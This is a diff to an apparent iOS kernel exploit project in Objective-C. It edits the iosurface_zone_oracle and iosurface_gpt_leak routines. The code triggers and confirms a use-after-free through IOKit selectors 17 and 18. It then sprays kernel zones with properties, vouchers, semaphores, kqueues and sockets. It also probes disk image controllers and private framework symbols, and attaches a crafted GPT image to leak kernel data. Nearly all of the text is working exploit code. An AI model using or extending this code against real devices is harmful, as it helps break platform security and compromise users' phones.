@@ -41990,10 +41990,10 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         uint64_t regIn[3] = {1, 2, 3};
 
         // Quick sanity: direct sel17 register to verify connection works
-        int sanity = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+        int sanity = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
         log([NSString stringWithFormat:@"JB56: sanity reg=0x%x", (unsigned)sanity]);
         if (sanity == 0) {
-            jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+            jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
         }
 
         // ---- T1: Baseline UAF confirm ----
@@ -42001,10 +42001,10 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         int t1_hits = 0;
         @try {
             for (int trial = 0; trial < 3 && !isr_stopped(); trial++) {
-                int r1 = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                int r2 = jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
-                int r3 = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                int r1 = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                int r2 = jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+                int r3 = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                 log([NSString stringWithFormat:@"JB56: T1 trial=%d reg=0x%x dereg=0x%x dup=0x%x",
                      trial, (unsigned)r1, (unsigned)r2, (unsigned)r3]);
@@ -42035,8 +42035,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T2 — IOConnectSetCFProperties spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     if (sym_setprops) {
                         for (int i = 0; i < 64; i++) {
@@ -42045,8 +42045,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    int dup = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     log([NSString stringWithFormat:@"JB56: T2 trial=%d dup=0x%x", trial, (unsigned)dup]);
                     if (dup == 0) {
@@ -42066,8 +42066,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T3 — mach_voucher_create spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     unsigned int vouchers[64];
                     int vcount = 0;
@@ -42098,8 +42098,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    int dup = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < vcount; i++) {
                         mach_port_deallocate(mach_task_self(), (mach_port_t)vouchers[i]);
@@ -42124,8 +42124,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T4 — semaphore_create spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     unsigned int sems[64];
                     int scount = 0;
@@ -42137,8 +42137,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    int dup = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < scount; i++) {
                         semaphore_destroy(mach_task_self(), (semaphore_t)sems[i]);
@@ -42163,8 +42163,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T5 — kqueue+kevent spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     int kqfds[32];
                     int kqcount = 0;
@@ -42178,8 +42178,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    int dup = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < kqcount; i++) {
                         close(kqfds[i]);
@@ -42204,8 +42204,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB56: T6 — socket+setsockopt spray");
             @try {
                 for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                    jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     int sockfds[32];
                     int sockcount = 0;
@@ -42219,8 +42219,8 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
                         }
                     }
 
-                    int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                    jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                    int dup = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                    jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                     for (int i = 0; i < sockcount; i++) {
                         close(sockfds[i]);
@@ -42285,15 +42285,15 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
 
                 if (okr2 == 0 && conn2 != 0) {
                     for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
-                        jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
-                        jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
-                        int r2 = jb41_callSel(conn2, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                        int r2 = jb41_callSel(conn2, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
 
-                        int dup = jb41_callSel(conn, 17, regIn, 3, 1, wp, (void*)sym_call, (void*)sym_async);
+                        int dup = jb41_callSel(conn, 17, regIn, 24, 1, wp, (void*)sym_call, (void*)sym_async);
 
-                        jb41_callSel(conn, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
-                        jb41_callSel(conn2, 18, regIn, 3, 0, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn2, 18, regIn, 24, 0, wp, (void*)sym_call, (void*)sym_async);
 
                         log([NSString stringWithFormat:@"JB56: T8 trial=%d regConn2=0x%x dupConn1=0x%x",
                              trial, (unsigned)r2, (unsigned)dup]);
@@ -42447,27 +42447,30 @@ void iosurface_gpt_leak(ISRLogBlock log, ISRDoneBlock done) {
             log([NSString stringWithFormat:@"JB57: U2 schemes=%d", u2_count]);
         }
 
-        // ---- U3: Disk image controller probe ----
+        // ---- U3: Disk image controller probe (try connection types 0-5) ----
         unsigned int hdix_conn = 0;
         NSString *hdix_class = @"NONE";
         if (!isr_stopped()) {
             log(@"JB57: --- U3: Disk image controller probe ---");
             const char *cls[] = {"IOHDIXController", "IODiskImageController",
                                  "HDIXController", "AppleDiskImageController", NULL};
-            for (int i = 0; cls[i] && !isr_stopped(); i++) {
+            for (int i = 0; cls[i] && !hdix_conn && !isr_stopped(); i++) {
                 unsigned int svc = sym_getmatch(0, sym_matching(cls[i]));
                 if (svc) {
-                    unsigned int c = 0;
-                    int okr = sym_open(svc, mach_task_self(), 0, &c);
-                    log([NSString stringWithFormat:@"JB57: U3 %s svc=%u open=0x%x conn=%u",
-                         cls[i], svc, okr, c]);
-                    sym_release(svc);
-                    if (okr == 0 && c) {
-                        hdix_conn = c;
-                        hdix_class = [NSString stringWithUTF8String:cls[i]];
-                        break;
+                    for (unsigned int ct = 0; ct <= 5 && !hdix_conn && !isr_stopped(); ct++) {
+                        unsigned int c = 0;
+                        int okr = sym_open(svc, mach_task_self(), ct, &c);
+                        log([NSString stringWithFormat:@"JB57: U3 %s type=%u open=0x%x conn=%u",
+                             cls[i], ct, okr, c]);
+                        if (okr == 0 && c) {
+                            hdix_conn = c;
+                            hdix_class = [NSString stringWithFormat:@"%s(type=%u)", cls[i], ct];
+                        }
                     }
-                    hdix_class = [NSString stringWithFormat:@"%s_DENIED(0x%x)", cls[i], okr];
+                    sym_release(svc);
+                    if (!hdix_conn) {
+                        hdix_class = [NSString stringWithFormat:@"%s_ALL_DENIED", cls[i]];
+                    }
                 } else {
                     log([NSString stringWithFormat:@"JB57: U3 %s not found", cls[i]]);
                 }
@@ -42476,30 +42479,49 @@ void iosurface_gpt_leak(ISRLogBlock log, ISRDoneBlock done) {
         results[@"u3_hdix"] = hdix_class;
         results[@"u3_conn"] = @(hdix_conn);
 
-        // ---- U4: DiskImages2 framework probe ----
+        // ---- U4: DiskImages2 / MediaKit / DiskImages symbol discovery ----
+        int u4_found = 0;
         if (!isr_stopped()) {
-            log(@"JB57: --- U4: DiskImages2 probe ---");
-            void *di2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
-            if (di2) {
-                log(@"JB57: U4 DiskImages2 LOADED");
-                void *f1 = dlsym(di2, "DIAttachParamsCreate");
-                void *f2 = dlsym(di2, "DIDeviceHandleCreate");
-                void *f3 = dlsym(di2, "DIMountAttach");
-                void *f4 = dlsym(di2, "DIAttachWithParams");
-                log([NSString stringWithFormat:@"JB57: U4 AttachParams=%p Handle=%p Mount=%p Attach=%p",
-                     f1, f2, f3, f4]);
-                results[@"u4_di2"] = @"LOADED";
-            } else {
-                log(@"JB57: U4 DiskImages2 not loadable");
-                results[@"u4_di2"] = @"NO";
+            log(@"JB57: --- U4: Framework symbol discovery ---");
+            const char *fwPaths[] = {
+                "/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2",
+                "/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages",
+                "/System/Library/PrivateFrameworks/MediaKit.framework/MediaKit",
+                "/System/Library/Frameworks/DiskArbitration.framework/DiskArbitration",
+                NULL
+            };
+            const char *symNames[] = {
+                "DIAttachParamsCreate", "DIDeviceHandleCreate", "DIMountAttach",
+                "DIAttachWithParams", "DIAttach", "DIDeviceAttach",
+                "DI2Attach", "DI2AttachWithURL", "DI2CreateDeviceHandle",
+                "HDIAttach", "HDICreateDiskImage", "HDIMount",
+                "MKDiskImageAttach", "MKAttachDiskImage",
+                "DADiskCreateFromBSDName", "DADiskCreateFromVolumePath",
+                "DADiskMount", "DADiskMountWithArguments",
+                "DASessionCreate", "DADiskCopyDescription",
+                "_DIAttach", "_DI2Attach",
+                "di_attach_image", "di_root_image_attach",
+                NULL
+            };
+            for (int fi = 0; fwPaths[fi] && !isr_stopped(); fi++) {
+                void *fh = dlopen(fwPaths[fi], RTLD_NOW);
+                if (!fh) {
+                    log([NSString stringWithFormat:@"JB57: U4 %s not loadable", fwPaths[fi]]);
+                    continue;
+                }
+                const char *fwShort = strrchr(fwPaths[fi], '/');
+                if (fwShort) fwShort++; else fwShort = fwPaths[fi];
+                log([NSString stringWithFormat:@"JB57: U4 %s LOADED", fwShort]);
+                for (int si = 0; symNames[si]; si++) {
+                    void *sp = dlsym(fh, symNames[si]);
+                    if (sp) {
+                        log([NSString stringWithFormat:@"JB57: U4 FOUND %s::%s = %p", fwShort, symNames[si], sp]);
+                        u4_found++;
+                    }
+                }
             }
-            void *mk = dlopen("/System/Library/PrivateFrameworks/MediaKit.framework/MediaKit", RTLD_NOW);
-            if (mk) {
-                log(@"JB57: U4 MediaKit LOADED");
-                results[@"u4_mediakit"] = @"YES";
-            } else {
-                results[@"u4_mediakit"] = @"NO";
-            }
+            results[@"u4_found"] = @(u4_found);
+            log([NSString stringWithFormat:@"JB57: U4 total_found=%d", u4_found]);
         }
 
         // ---- U5: Create crafted GPT image ----
@@ -42652,22 +42674,24 @@ void iosurface_gpt_leak(ISRLogBlock log, ISRDoneBlock done) {
                 sym_close(hdix_conn);
             }
 
-            // U6b: Try DiskImages2 DIAttachWithParams
+            // U6b: Try DiskArbitration to mount the image
             if (!u6_attached && !isr_stopped()) {
-                log(@"JB57: U6b DiskImages2 attempt");
-                void *di2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
-                if (di2) {
-                    typedef void*(*di_url_create_fn)(void*, void*);
-                    typedef int(*di_attach_fn)(void*, void*, void*);
-                    di_attach_fn di_attach = (di_attach_fn)dlsym(di2, "DIAttachWithParams");
-                    if (di_attach) {
-                        NSURL *fileURL = [NSURL fileURLWithPath:imgPath];
-                        int dr = di_attach((__bridge void*)fileURL, NULL, NULL);
-                        log([NSString stringWithFormat:@"JB57: U6b DIAttach=0x%x", dr]);
-                        if (dr == 0) u6_attached = 1;
-                    } else {
-                        log(@"JB57: U6b DIAttachWithParams not found");
+                log(@"JB57: U6b DiskArbitration attempt");
+                void *da = dlopen("/System/Library/Frameworks/DiskArbitration.framework/DiskArbitration", RTLD_NOW);
+                if (da) {
+                    typedef void*(*da_session_fn)(void*);
+                    typedef void*(*da_disk_bsd_fn)(void*, void*, const char*);
+                    da_session_fn da_sess = (da_session_fn)dlsym(da, "DASessionCreate");
+                    da_disk_bsd_fn da_bsd = (da_disk_bsd_fn)dlsym(da, "DADiskCreateFromBSDName");
+                    log([NSString stringWithFormat:@"JB57: U6b DASessionCreate=%p DADiskCreateFromBSDName=%p",
+                         da_sess, da_bsd]);
+                    if (da_sess) {
+                        void *sess = da_sess(NULL);
+                        log([NSString stringWithFormat:@"JB57: U6b session=%p", sess]);
+                        if (sess && sym_cfrel) sym_cfrel(sess);
                     }
+                } else {
+                    log(@"JB57: U6b DiskArbitration not loadable");
                 }
             }
 
@@ -42729,6 +42753,8 @@ void iosurface_gpt_leak(ISRLogBlock log, ISRDoneBlock done) {
             verdict = @"ATTACHED_NO_LEAK";
         } else if (hdix_conn) {
             verdict = @"HDIX_ACCESSIBLE";
+        } else if (u5_created && u4_found > 0) {
+            verdict = @"SYMBOLS_FOUND";
         } else if (u5_created) {
             verdict = @"IMAGE_CREATED";
         }
